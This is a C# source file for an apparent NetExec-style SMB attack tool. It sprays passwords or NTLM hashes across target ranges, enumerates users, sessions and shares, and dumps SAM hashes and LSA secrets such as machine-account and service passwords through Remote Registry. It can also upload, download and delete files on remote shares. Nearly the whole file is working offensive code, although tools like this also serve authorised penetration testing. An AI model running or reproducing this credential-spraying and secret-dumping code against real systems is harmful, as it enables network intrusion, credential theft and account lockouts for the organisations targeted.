using System.ComponentModel;
using System.Text;
using ms_srvs;
using Titanis;
using Titanis.Cli;
using Titanis.DceRpc;
using Titanis.DceRpc.Client;
using Titanis.Msrpc;
using Titanis.Msrpc.Mssamr;
using Titanis.Msrpc.Mswkst;
using Titanis.Msrpc.Msrrp;
using Titanis.Net;
using Titanis.Security;
using Titanis.Smb2;
using Titanis.Winterop.Lsa;
using Titanis.Winterop.Registry;
using Titanis.Winterop.Security;
using Titanis.Winterop.SamServer;

namespace Atlas.Protocols;

/// <summary>
/// NetExec-style SMB protocol host: authenticate against a list of targets and
/// run enumeration actions, built on Titanis.Smb2 and Titanis RPC stacks.
/// </summary>
[Description("Interacts with SMB servers (auth check, shares, sessions, users, ls)")]
public sealed class SmbCommand : Command
{
	private const int SmbPort = 445;

	[Parameter(0)]
	[Placeholder("targets")]
	[Description("Targets as host, IP, CIDR, range (a.b.c.d-e), comma list, or @file")]
	public string? TargetSpec { get; set; }

	[ParameterGroup(ParameterGroupOptions.AlwaysInstantiate)]
	public AuthenticationParameters Authentication { get; set; } = null!;

	[ParameterGroup(ParameterGroupOptions.AlwaysInstantiate)]
	public NetworkParameters? NetParameters { get; set; }

	[ParameterGroup(ParameterGroupOptions.AlwaysInstantiate)]
	public SmbParameters SmbParameters { get; set; } = null!;

	// ---- Actions ----
	[Parameter]
	[Description("Enumerate shares via SRVS RPC")]
	public SwitchParam Shares { get; set; }

	[Parameter]
	[Description("Enumerate active sessions via SRVS RPC")]
	public SwitchParam Sessions { get; set; }

	[Parameter]
	[Description("Enumerate users via SAMR RPC")]
	public SwitchParam Users { get; set; }

	[Parameter]
	[Description("Enumerate groups via SAMR RPC")]
	public SwitchParam Groups { get; set; }

	[Parameter]
	[Description("Enumerate local disks via SRVS RPC")]
	public SwitchParam Disks { get; set; }

	[Parameter]
	[Description("Dump local SAM hashes via Remote Registry (requires admin)")]
	public SwitchParam Sam { get; set; }

	[Parameter]
	[Description("Dump LSA secrets via Remote Registry (requires admin)")]
	public SwitchParam Lsa { get; set; }

	[Parameter]
	[Description("List a directory: ShareName or ShareName\\relative\\path")]
	public string? LsPath { get; set; }

	[Parameter]
	[Description("Download a remote file: ShareName\\relative\\path (saved to current directory)")]
	public string? GetFile { get; set; }

	[Parameter]
	[Description("Local file to upload (use with -PutDest)")]
	public string? PutSource { get; set; }

	[Parameter]
	[Description("Remote destination: ShareName\\relative\\path (use with -PutSource)")]
	public string? PutDest { get; set; }

	[Parameter]
	[Description("Create a remote directory: ShareName\\relative\\path")]
	public string? MkdirPath { get; set; }

	[Parameter]
	[Description("Delete a remote file: ShareName\\relative\\path")]
	public string? RmFile { get; set; }

	// ---- Modules ----
	[Parameter]
	[Alias("M")]
	[Description("Module(s) to run after authentication (comma-separated)")]
	public string[]? Modules { get; set; }

	[Parameter]
	[Alias("mo")]
	[Description("Module options as key=value pairs separated by commas")]
	public string? ModuleOptions { get; set; }

	[Parameter]
	[Description("List available modules and exit")]
	public SwitchParam ListModules { get; set; }

	// ---- Credential spray ----
	[Parameter]
	[Description("User(s) for spray: comma-separated list or @file (overrides -UserName)")]
	public string? UserList { get; set; }

	[Parameter]
	[Description("Password(s)/hash(es) for spray: comma-separated list or @file (overrides -Password/-NtlmHash)")]
	public string? PassList { get; set; }

	[Parameter]
	[DefaultValue(1)]
	[Alias("t")]
	[Description("Number of concurrent targets")]
	public int Threads { get; set; } = 1;

	[Parameter]
	[DefaultValue(30)]
	[Description("Per-host timeout in seconds")]
	public int Timeout { get; set; } = 30;

	protected override void ValidateParameters(ParameterValidationContext context)
	{
		if (this.ListModules.IsSet)
			return;

		if (string.IsNullOrEmpty(this.TargetSpec))
			context.LogError(nameof(this.TargetSpec), "No targets specified");

		this.NetParameters?.ValidateParameters(context);

		bool spray = this.UserList is not null || this.PassList is not null;
		bool requireCreds = !this.Authentication.Anonymous.IsSet && !spray;
		this.Authentication.Validate(requireCreds, context);
		this.SmbParameters.Validate(context, this.Authentication);

		if (this.Threads < 1)
			context.LogError(nameof(this.Threads), "Threads must be >= 1");
		if (this.Timeout < 1)
			context.LogError(nameof(this.Timeout), "Timeout must be >= 1");

		if ((this.PutSource is null) != (this.PutDest is null))
			context.LogError(nameof(this.PutSource), "-PutSource and -PutDest must be used together");

		try
		{
			var targets = TargetList.Parse(this.TargetSpec!);
			if (targets.Count == 0)
				context.LogError(nameof(this.TargetSpec), "No valid targets specified");
		}
		catch (Exception ex)
		{
			context.LogError(nameof(this.TargetSpec), ex.Message);
		}

		if (this.AttrsSpecified())
			context.LogError(nameof(this.ModuleOptions), "Module options must be key=value pairs");

		if (!this.Shares.IsSet && !this.Sessions.IsSet && !this.Users.IsSet && !this.Groups.IsSet && !this.Disks.IsSet
			&& !this.Sam.IsSet && !this.Lsa.IsSet
			&& this.LsPath is null && this.GetFile is null && this.PutSource is null
			&& this.MkdirPath is null && this.RmFile is null
			&& (this.Modules is null || this.Modules.Length == 0))
		{
			this.Log.WriteVerbose("No actions requested; performing authentication check only.");
		}
	}

	private bool AttrsSpecified()
	{
		if (this.ModuleOptions is null)
			return false;
		foreach (var pair in this.ModuleOptions.Split(',', StringSplitOptions.TrimEntries | StringSplitOptions.RemoveEmptyEntries))
		{
			if (pair.IndexOf('=') <= 0)
				return true;
		}
		return false;
	}

	protected sealed override async Task<int> RunAsync(CancellationToken cancellationToken)
	{
		if (this.ListModules.IsSet)
		{
			foreach (var mod in AtlasModuleRegistry.Discover<Smb2Client>())
			{
				AtlasConsole.Line($"  {mod.Name,-16} {mod.Description}");
			}
			return 0;
		}

		var targets = TargetList.Parse(this.TargetSpec);
		int failures = 0;

		bool spray = this.UserList is not null || this.PassList is not null;
		if (spray)
			return await this.SprayAsync(targets, cancellationToken).ConfigureAwait(false);

		await Parallel.ForEachAsync(
			targets,
			new ParallelOptions
			{
				MaxDegreeOfParallelism = this.Threads,
				CancellationToken = cancellationToken,
			},
			async (host, token) =>
			{
				using var timeoutCts = CancellationTokenSource.CreateLinkedTokenSource(token);
				timeoutCts.CancelAfter(TimeSpan.FromSeconds(this.Timeout));
				try
				{
					await this.ProcessHostAsync(host, timeoutCts.Token).ConfigureAwait(false);
				}
				catch (OperationCanceledException) when (token.IsCancellationRequested)
				{
					throw;
				}
				catch (OperationCanceledException)
				{
					Interlocked.Increment(ref failures);
					AtlasConsole.Fail($"{host}:{SmbPort}", $"No response within {this.Timeout}s (timeout)");
				}
				catch (Exception ex)
				{
					Interlocked.Increment(ref failures);
					string msg = this.Verbose.IsSet ? ex.ToString() : ex.Message;
					AtlasConsole.Fail($"{host}:{SmbPort}", msg);
				}
			}).ConfigureAwait(false);

		return failures > 0 ? 1 : 0;
	}

	private async Task ProcessHostAsync(string host, CancellationToken cancellationToken)
	{
		await using Smb2Client smb = this.SmbParameters.CreateClient();

		// Bind SRVS over \IPC$ - this connects, negotiates, authenticates.
		RpcClient rpc = this.Services.CreateRpcClient();
		ServerServiceClient srvs = new ServerServiceClient();
		string pipe = srvs.WellKnownPipeName ?? "srvsvc";
		await rpc.ConnectPipe(srvs, smb, new UncPath(host, Smb2Client.IpcName, pipe), cancellationToken).ConfigureAwait(false);

		AtlasConsole.Success($"{host}:{SmbPort}", this.DescribePrincipal());

		if (this.Shares.IsSet)
			await this.EnumSharesAsync(srvs, host, cancellationToken).ConfigureAwait(false);

		if (this.Sessions.IsSet)
			await this.EnumSessionsAsync(srvs, host, cancellationToken).ConfigureAwait(false);

		if (this.Users.IsSet)
			await this.EnumUsersAsync(smb, host, cancellationToken).ConfigureAwait(false);

		if (this.Groups.IsSet)
			await this.EnumGroupsAsync(smb, host, cancellationToken).ConfigureAwait(false);

		if (this.Disks.IsSet)
			await this.EnumDisksAsync(srvs, host, cancellationToken).ConfigureAwait(false);

		if (this.Sam.IsSet)
			await this.DumpSamAsync(smb, host, cancellationToken).ConfigureAwait(false);

		if (this.Lsa.IsSet)
			await this.DumpLsaAsync(smb, host, cancellationToken).ConfigureAwait(false);

		if (this.LsPath is not null)
			await this.ListDirectoryAsync(smb, host, this.LsPath, cancellationToken).ConfigureAwait(false);

		if (this.GetFile is not null)
			await this.GetFileAsync(smb, host, this.GetFile, cancellationToken).ConfigureAwait(false);

		if (this.PutSource is not null && this.PutDest is not null)
			await this.PutFileAsync(smb, host, this.PutSource, this.PutDest, cancellationToken).ConfigureAwait(false);

		if (this.MkdirPath is not null)
			await this.MkdirAsync(smb, host, this.MkdirPath, cancellationToken).ConfigureAwait(false);

		if (this.RmFile is not null)
			await this.RmFileAsync(smb, host, this.RmFile, cancellationToken).ConfigureAwait(false);

		if (this.Modules is not null && this.Modules.Length > 0)
		{
			var names = this.Modules.SelectMany(m => m.Split(',', StringSplitOptions.TrimEntries | StringSplitOptions.RemoveEmptyEntries));
			var options = AtlasModuleRegistry.ParseOptionString(this.ModuleOptions);
			foreach (var mod in AtlasModuleRegistry.Select<Smb2Client>(names))
			{
				await mod.RunAsync(new AtlasModuleContext<Smb2Client>
				{
					Host = host,
					Client = smb,
					Services = this.Services,
					Options = options,
				}, cancellationToken).ConfigureAwait(false);
			}
		}
	}

	private static List<string> ExpandCredSpec(string spec)
	{
		var results = new List<string>();
		foreach (var entry in spec.Split(',', StringSplitOptions.TrimEntries | StringSplitOptions.RemoveEmptyEntries))
		{
			if (entry.StartsWith('@'))
			{
				string path = entry[1..];
				if (!File.Exists(path))
					throw new FileNotFoundException($"Credential file not found: {path}");
				foreach (var line in File.ReadLines(path))
				{
					var trimmed = line.Trim();
					if (trimmed.Length > 0 && !trimmed.StartsWith('#'))
						results.Add(trimmed);
				}
			}
			else
			{
				results.Add(entry);
			}
		}
		return results;
	}

	private async Task<int> SprayAsync(List<string> hosts, CancellationToken cancellationToken)
	{
		List<string> users = (this.UserList is not null) ? ExpandCredSpec(this.UserList) : new List<string>();
		List<string> passes = (this.PassList is not null) ? ExpandCredSpec(this.PassList) : new List<string>();

		bool singleUser = this.UserList is null && this.Authentication.UserName is not null;
		bool hashMode = this.Authentication.NtlmHash is not null;

		if (users.Count == 0 && !singleUser)
			throw new InvalidOperationException("Spray requires -UserList or -UserName");
		if (passes.Count == 0)
			throw new InvalidOperationException("Spray requires -PassList");

		if (users.Count > 1 && passes.Count > 1)
			AtlasConsole.Line("INFO: Multiple users AND multiple passwords specified; watch out for account lockouts.");

		int failures = 0;
		int successes = 0;

		foreach (var host in hosts)
		{
			string effectiveUser = this.Authentication.UserName?.WireName ?? string.Empty;
			foreach (var user in (users.Count > 0) ? users : new List<string> { effectiveUser })
			{
				foreach (var pass in passes)
				{
					cancellationToken.ThrowIfCancellationRequested();
					if (user.Length > 0)
						this.Authentication.UserName = new Titanis.Security.UserPrincipalName(user, null, user);

					if (hashMode)
						this.Authentication.NtlmHash = HexString.Parse(pass);
					else
						this.Authentication.Password = pass;

					try
					{
						await using Smb2Client smb = this.SmbParameters.CreateClient();
						RpcClient rpc = this.Services.CreateRpcClient();
						ServerServiceClient srvs = new ServerServiceClient();
						string pipe = srvs.WellKnownPipeName ?? "srvsvc";
						await rpc.ConnectPipe(srvs, smb, new UncPath(host, Smb2Client.IpcName, pipe), cancellationToken).ConfigureAwait(false);

						successes++;
						AtlasConsole.Success($"{host}:{SmbPort}", $"{(user.Length > 0 ? user : "(null)")}:{pass}");
					}
					catch (OperationCanceledException) when (cancellationToken.IsCancellationRequested)
					{
						throw;
					}
					catch
					{
						failures++;
						AtlasConsole.Fail($"{host}:{SmbPort}", $"{(user.Length > 0 ? user : "(null)")}:{pass}");
					}
				}
			}
		}

		AtlasConsole.Info("*:*", $"spray complete: {successes} success(es), {failures} failure(s)");
		return 0;
	}

	private string DescribePrincipal()
	{
		if (this.Authentication.Anonymous.IsSet)
			return "(anonymous)";
		var upn = this.Authentication.UserName;
		if (upn is null)
			return "(null session)";
		string name = upn.WireName ?? string.Empty;
		return string.IsNullOrEmpty(this.Authentication.UserDomain)
			? name
			: $"{this.Authentication.UserDomain}\\{name}";
	}

	private async Task EnumSharesAsync(ServerServiceClient srvs, string host, CancellationToken cancellationToken)
	{
		IList<ShareInfo> shares;
		try
		{
			shares = await srvs.GetShares(@"\\" + host, ShareInfoLevel.Level502, ServerServiceClient.DefaultReturnBufferSize, cancellationToken).ConfigureAwait(false);
		}
		catch
		{
			shares = await srvs.GetShares(@"\\" + host, ShareInfoLevel.Level1, ServerServiceClient.DefaultReturnBufferSize, cancellationToken).ConfigureAwait(false);
		}

		foreach (var share in shares.OrderBy(r => r.ShareName, StringComparer.OrdinalIgnoreCase))
		{
			string tag = share.ShareName switch
			{
				"IPC$" or "ADMIN$" => " [Default]",
				"C$" or "D$" or "E$" => " [Default (admin)]",
				_ => string.Empty,
			};
			string remark = string.IsNullOrEmpty(share.Remark) ? string.Empty : $" - '{share.Remark}'";
			AtlasConsole.Info($"{host}:{SmbPort}", $"share: {share.ShareName}{remark}{tag}");
		}
		AtlasConsole.Info($"{host}:{SmbPort}", $"{shares.Count} share(s) enumerated.");
	}

	private async Task EnumSessionsAsync(ServerServiceClient srvs, string host, CancellationToken cancellationToken)
	{
		IList<SessionInfo> sessions;
		try
		{
			sessions = await srvs.GetSessions(@"\\" + host, null, null, SessionInfoLevel.Level10, ServerServiceClient.DefaultReturnBufferSize, cancellationToken).ConfigureAwait(false);
		}
		catch
		{
			sessions = await srvs.GetSessions(@"\\" + host, null, null, SessionInfoLevel.Level0, ServerServiceClient.DefaultReturnBufferSize, cancellationToken).ConfigureAwait(false);
		}

		foreach (var s in sessions)
		{
			AtlasConsole.Info($"{host}:{SmbPort}", $"session: {s.UserName} from {s.ClientName} (idle: {s.IdleTime}s)");
		}
		AtlasConsole.Info($"{host}:{SmbPort}", $"{sessions.Count} active session(s).");
	}

	private async Task EnumGroupsAsync(Smb2Client smb, string host, CancellationToken cancellationToken)
	{
		RpcClient rpc = this.Services.CreateRpcClient();
		SamClient samClient = new SamClient();
		string pipe = samClient.WellKnownPipeName ?? "samr";
		await rpc.ConnectPipe(samClient, smb, new UncPath(host, Smb2Client.IpcName, pipe), cancellationToken).ConfigureAwait(false);

		using Sam sam = await samClient.Connect(SamServerAccessRights.EnumerateDomains | SamServerAccessRights.LookupDomain, host, cancellationToken).ConfigureAwait(false);
		var domains = await sam.GetDomains(cancellationToken).ConfigureAwait(false);

		int total = 0;
		foreach (var domainInfo in domains)
		{
			SamDomain domain;
			try
			{
				domain = await sam.OpenDomainAsync(domainInfo.Name, SamDomainAccessRights.ListAccounts | SamDomainAccessRights.Read | SamDomainAccessRights.Lookup, cancellationToken).ConfigureAwait(false);
			}
			catch (Exception ex)
			{
				AtlasConsole.Warn($"{host}:{SmbPort}", $"cannot open domain '{domainInfo.Name}': {ex.Message}");
				continue;
			}

			using (domain)
			{
				var groups = await domain.EnumGroups(cancellationToken).ConfigureAwait(false);
				foreach (var g in groups)
				{
					total++;
					AtlasConsole.Success($"{host}:{SmbPort}", $"group: [{domainInfo.Name}] {g.Name} (rid: {g.Id})");
				}
			}
		}
		AtlasConsole.Info($"{host}:{SmbPort}", $"{total} group(s) enumerated.");
	}

	private async Task EnumDisksAsync(ServerServiceClient srvs, string host, CancellationToken cancellationToken)
	{
		var disks = await srvs.GetDisks(@"\\" + host, ServerServiceClient.DefaultReturnBufferSize, cancellationToken).ConfigureAwait(false);
		foreach (var d in disks)
			AtlasConsole.Info($"{host}:{SmbPort}", $"disk: {d}");
		AtlasConsole.Info($"{host}:{SmbPort}", $"{disks.Count} disk(s) enumerated.");
	}

	private async Task<RemoteRegistryClient> BindWinregAsync(Smb2Client smb, string host, CancellationToken cancellationToken)
	{
		RpcClient rpc = this.Services.CreateRpcClient();
		RemoteRegistryClient client = new RemoteRegistryClient();
		string pipe = client.WellKnownPipeName ?? "winreg";
		await rpc.ConnectPipe(client, smb, new UncPath(host, Smb2Client.IpcName, pipe), cancellationToken).ConfigureAwait(false);
		return client;
	}

	private async Task DumpSamAsync(Smb2Client smb, string host, CancellationToken cancellationToken)
	{
		using RemoteRegistryClient reg = await this.BindWinregAsync(smb, host, cancellationToken).ConfigureAwait(false);

		byte[] syskey = await LsaStore.ExtractSyskey(reg, RegistryKeyOptions.None, this.Log, cancellationToken).ConfigureAwait(false);
		SamRegistryServer samServer = await SamRegistryServer.Open(syskey, reg, RegistryKeyOptions.None, this.Log, cancellationToken).ConfigureAwait(false);

		SamUserHash[] hashes = await samServer.DumpUserHashes(cancellationToken).ConfigureAwait(false);
		foreach (var h in hashes)
		{
			string lm = "aad3b435b51404eeaad3b435b51404ee";
			string nt = h.NtlmHashText ?? "31d6cfe0d16ae931b73c59d7e0c089c0";
			AtlasConsole.Success($"{host}:{SmbPort}", $"{h.AccountName}:{h.Rid}:{lm}:{nt}:::");
		}
		AtlasConsole.Info($"{host}:{SmbPort}", $"{hashes.Length} account hash(es) dumped from SAM.");
	}

	private async Task DumpLsaAsync(Smb2Client smb, string host, CancellationToken cancellationToken)
	{
		using RemoteRegistryClient reg = await this.BindWinregAsync(smb, host, cancellationToken).ConfigureAwait(false);

		LsaStore lsaStore = await LsaStore.Open(reg, RegistryKeyOptions.None, this.Log, cancellationToken).ConfigureAwait(false);
		LsaSecret[] secrets = await lsaStore.GetSecrets(cancellationToken).ConfigureAwait(false);

		int count = 0;
		foreach (var secret in secrets)
		{
			if (secret.CurrentValue is null || secret.CurrentValue.Length == 0)
				continue;

			string nameUpper = secret.Name.ToUpperInvariant();
			bool interesting =
				nameUpper is "$MACHINE.ACC" or "DEFAULTPASSWORD"
				|| secret.Name.StartsWith("_SC_", StringComparison.OrdinalIgnoreCase)
				|| secret.Name.StartsWith("SCM:", StringComparison.OrdinalIgnoreCase);
			if (!interesting)
				continue;

			count++;
			string value = Encoding.Unicode.GetString(secret.CurrentValue).TrimEnd('\0');
			AtlasConsole.Success($"{host}:{SmbPort}", $"(lsa) {secret.Name}: {value}");
		}
		AtlasConsole.Info($"{host}:{SmbPort}", $"{count} interesting LSA secret(s); {secrets.Length} total.");
	}

	private async Task EnumUsersAsync(Smb2Client smb, string host, CancellationToken cancellationToken)
	{
		RpcClient rpc = this.Services.CreateRpcClient();
		SamClient samClient = new SamClient();
		string pipe = samClient.WellKnownPipeName ?? "samr";
		await rpc.ConnectPipe(samClient, smb, new UncPath(host, Smb2Client.IpcName, pipe), cancellationToken).ConfigureAwait(false);

		using Sam sam = await samClient.Connect(SamServerAccessRights.EnumerateDomains | SamServerAccessRights.LookupDomain, host, cancellationToken).ConfigureAwait(false);
		var domains = await sam.GetDomains(cancellationToken).ConfigureAwait(false);

		int total = 0;
		foreach (var domainInfo in domains)
		{
			SamDomain domain;
			try
			{
				domain = await sam.OpenDomainAsync(domainInfo.Name, SamDomainAccessRights.ListAccounts | SamDomainAccessRights.Read | SamDomainAccessRights.Lookup, cancellationToken).ConfigureAwait(false);
			}
			catch (Exception ex)
			{
				AtlasConsole.Warn($"{host}:{SmbPort}", $"cannot open domain '{domainInfo.Name}': {ex.Message}");
				continue;
			}

			using (domain)
			{
				var entries = await domain.EnumUsers(cancellationToken).ConfigureAwait(false);
				foreach (var entry in entries)
				{
					total++;
					AtlasConsole.Success($"{host}:{SmbPort}", $"user: [{domainInfo.Name}] {entry.Name} (rid: {entry.Id})");
				}
			}
		}
		AtlasConsole.Info($"{host}:{SmbPort}", $"{total} user(s) enumerated.");
	}

	private static (string share, string relative) SplitPath(string pathSpec)
	{
		int idx = pathSpec.IndexOf('\\');
		if (idx < 0)
			return (pathSpec, string.Empty);
		return (pathSpec[..idx], pathSpec[(idx + 1)..]);
	}

	private async Task ListDirectoryAsync(Smb2Client smb, string host, string pathSpec, CancellationToken cancellationToken)
	{
		var (share, relative) = SplitPath(pathSpec);

		await using Smb2Directory dir = await smb.OpenDirectoryAsync(new UncPath(host, share, relative), cancellationToken).ConfigureAwait(false);
		List<Smb2DirEntry> entries = await dir.QueryDirAsync(cancellationToken).ConfigureAwait(false);

		foreach (var e in entries.Where(r => r.FileName is not "." and not "..").OrderByDescending(r => r.IsDirectory).ThenBy(r => r.FileName, StringComparer.OrdinalIgnoreCase))
		{
			string kind = e.IsDirectory ? "d" : "-";
			AtlasConsole.Info($"{host}:{SmbPort}", $"{kind} {e.Size,12} {e.LastWriteTime:yyyy-MM-dd HH:mm} {e.FileName}");
		}
		AtlasConsole.Info($"{host}:{SmbPort}", $"{entries.Count} entr(ies) in \\\\{host}\\{share}\\{relative}");
	}

	private async Task GetFileAsync(Smb2Client smb, string host, string pathSpec, CancellationToken cancellationToken)
	{
		var (share, relative) = SplitPath(pathSpec);
		if (relative.Length == 0)
			throw new ArgumentException("-Get requires a file path: ShareName\\file");

		string localName = Path.GetFileName(relative.Replace('\\', Path.DirectorySeparatorChar));

		await using Smb2FileStream stream = await smb.OpenFileReadAsync(new UncPath(host, share, relative), cancellationToken).ConfigureAwait(false);
		using FileStream local = File.Create(localName);
		await stream.CopyToAsync(local, cancellationToken).ConfigureAwait(false);
		AtlasConsole.Success($"{host}:{SmbPort}", $"got {relative} -> {localName} ({local.Length} bytes)");
	}

	private async Task PutFileAsync(Smb2Client smb, string host, string sourcePath, string destSpec, CancellationToken cancellationToken)
	{
		if (!File.Exists(sourcePath))
			throw new FileNotFoundException($"Local file not found: {sourcePath}");

		var (share, relative) = SplitPath(destSpec);
		if (relative.Length == 0)
			throw new ArgumentException("-PutDest requires a destination path: ShareName\\file");

		Smb2CreateInfo create = new Smb2CreateInfo
		{
			CreateDisposition = Smb2CreateDisposition.Supersede,
			DesiredAccess = (uint)Smb2FileAccessRights.GenericWrite,
			ShareAccess = Smb2ShareAccess.Read,
			FileAttributes = Titanis.Winterop.FileAttributes.Normal,
			ImpersonationLevel = Smb2ImpersonationLevel.Impersonation,
			CreateOptions = Smb2FileCreateOptions.NonDirectory | Smb2FileCreateOptions.SynchronousIoNonalert
		};

		await using Smb2OpenFile remote = (Smb2OpenFile)await smb.CreateFileAsync(new UncPath(host, share, relative), create, FileAccess.Write, cancellationToken).ConfigureAwait(false);
		await using Stream remoteStream = remote.GetStream(false);

		using FileStream local = File.OpenRead(sourcePath);
		await local.CopyToAsync(remoteStream, cancellationToken).ConfigureAwait(false);
		await remoteStream.FlushAsync(cancellationToken).ConfigureAwait(false);
		AtlasConsole.Success($"{host}:{SmbPort}", $"put {sourcePath} -> \\\\{host}\\{share}\\{relative} ({local.Length} bytes)");
	}

	private async Task MkdirAsync(Smb2Client smb, string host, string pathSpec, CancellationToken cancellationToken)
	{
		var (share, relative) = SplitPath(pathSpec);
		await smb.CreateDirectoryAsync(new UncPath(host, share, relative), cancellationToken).ConfigureAwait(false);
		AtlasConsole.Success($"{host}:{SmbPort}", $"created \\\\{host}\\{share}\\{relative}");
	}

	private async Task RmFileAsync(Smb2Client smb, string host, string pathSpec, CancellationToken cancellationToken)
	{
		var (share, relative) = SplitPath(pathSpec);
		if (relative.Length == 0)
			throw new ArgumentException("-Rm requires a file path: ShareName\\file");
		await smb.DeleteFileAsync(new UncPath(host, share, relative), cancellationToken).ConfigureAwait(false);
		AtlasConsole.Success($"{host}:{SmbPort}", $"deleted \\\\{host}\\{share}\\{relative}");
	}
}
